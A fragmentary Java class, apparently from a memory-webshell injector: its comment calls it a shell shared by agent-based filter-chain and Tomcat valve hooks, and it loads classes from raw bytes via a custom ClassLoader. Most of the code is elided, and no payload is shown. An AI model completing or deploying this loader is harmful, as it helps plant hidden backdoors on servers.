...
/** AgentFilterChain/AgentContextValve 共用的无 Servlet 编译依赖 Shell。 */
public class LeoAgentTpl extends ClassLoader {
    ...
    public LeoAgentTpl(ClassLoader parent) {
        super(parent);
    }
    ...
    private Class loadCore() throws Exception {
        ...
        try {
            ...
            return new LeoAgentTpl(loader).defineClass(null, bytes, 0, bytes.length);
        }
    }
